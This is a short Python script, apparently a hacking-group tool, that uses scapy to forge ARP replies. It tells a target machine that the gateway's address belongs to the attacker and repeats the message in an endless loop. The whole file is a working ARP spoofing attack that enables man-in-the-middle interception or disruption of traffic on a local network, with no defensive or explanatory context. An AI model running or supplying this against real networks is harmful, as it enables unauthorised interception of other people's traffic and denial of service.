#!/usr/bin/python
# Coded By Afrizal F.A - ICWR-TECH
import sys, subprocess
from scapy.all import *

reply=1
target=sys.argv[1]
route=sys.argv[2]

arp=ARP(op=reply,psrc=route,pdst=target)

while True :
    send(arp)
